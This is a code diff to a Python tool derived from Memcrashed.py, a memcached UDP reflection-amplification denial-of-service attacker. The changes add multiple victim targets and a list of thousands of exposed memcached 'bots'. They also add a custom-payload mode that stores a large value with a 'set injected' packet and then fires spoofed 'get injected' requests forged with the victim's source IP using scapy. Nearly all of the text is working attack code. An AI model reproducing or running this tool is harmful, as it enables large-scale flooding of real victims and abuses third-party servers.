@@ -1,16 +1,23 @@
 #!/usr/bin/env python3
 
+#
 # Based on Memcrashed.py
+#
 # Changes made:
 # * pass configuration as options/flags rather than through interactive session
-# * multiple target IP:PORT pairs
+# * support multiple targets (IP:PORT pairs)
 # * shodan API is not used, the list of servers should be available in bots.txt
-# * smart scheduling for sending UDP packets
+#   (see README file with step-by-step guide how to download list of 17k+ servers)
+#
+# Known limitations:
+# * memcached port is asuumed to be 11211 for all given bot IPs
+#   (which is consistent with how Shadon search API is used anyways)
+#
 
 import click
 from scapy.all import *
 from tqdm import tqdm
-from typing import List
+from typing import List, Optional
 
 
 logo = """
@@ -74,12 +81,21 @@ def read_bots(filepath:str="./bots.txt") -> List[str]:
         return [ip.strip() for ip in  fd.readlines() if ip.strip() != ""]
 
 
-def prepare_packet(
-    dest_ip: str, dest_port: int,
-    target_ip: str, target_port: int,
-    payload: str = STATS_PAYLOAD
+def prepare_packets(
+    dest_ip: str,
+    dest_port: int,
+    target_ip: str,
+    target_port: int,
+    payload: Optional[str] = STATS_PAYLOAD,
+    num_packets: int = 1,
 ):
-    return IP(src=target_ip, dst=dest_ip) / UDP(sport=target_port, dport=dest_port) / Raw(load=payload)
+    payload = STATS_PAYLOAD if payload is None else payload
+    if payload != STATS_PAYLOAD:
+        size = str(len(payload)+1)
+        setdata = f"\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00{size}\r\n{payload}\r\n"
+        yield (IP(src=target_ip, dst=dest_ip) / UDP(sport=target_port, dport=dest_port) / Raw(load=setdata), 1)
+        payload = "\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n"
+    yield (IP(src=target_ip, dst=dest_ip) / UDP(sport=target_port, dport=dest_port) / Raw(load=payload), num_packets)
 
 
 class IpPortPair(click.ParamType):
@@ -96,14 +112,14 @@ class IpPortPair(click.ParamType):
         return (ip, port)
 
 
-# xxx(okachaiev): implement custom payload
 @click.command()
 @click.option("--targets", "-t", type=IpPortPair(), help="<ip:port> pair", multiple=True)
 @click.option("--num-packets", default=1, help="Number of packets to send to each Memcached server (per loop)")
 @click.option("--bots-config", default="./bots.txt", help="Path to file with the list of Memcached servers")
 @click.option("--repeat", default=1, help="How many times to loop over list of bot servers")
 @click.option("--logo/--no-logo", default=True)
-def crash(targets, num_packets, bots_config, repeat, logo):
+@click.option("--payload", default=None, help="Packet payload (defaults to 'stats' request)")
+def crash(targets, num_packets, bots_config, repeat, logo, payload):
     if not targets:
         print(f"ERROR: at least a single target should be specified")
         exit(1)
@@ -124,8 +140,15 @@ def crash(targets, num_packets, bots_config, repeat, logo):
             with tqdm(total=n_bots*num_packets) as progress:
                 for bot in bots:
                     progress.set_description(f"==> [{loop}] targeting {ip: >16}:{port} -- {bot: <16}")
-                    packet = prepare_packet(dest_ip=bot, dest_port=MEMCACHED_PORT, target_ip=ip, target_port=port)
-                    send(packet, count=num_packets, verbose=False)
+                    for packet, to_send in prepare_packets(
+                        dest_ip=bot,
+                        dest_port=MEMCACHED_PORT,
+                        target_ip=ip,
+                        target_port=port,
+                        payload=payload,
+                        num_packets=num_packets
+                    ):
+                        send(packet, count=to_send, verbose=False)
                     progress.update(num_packets)
 
 
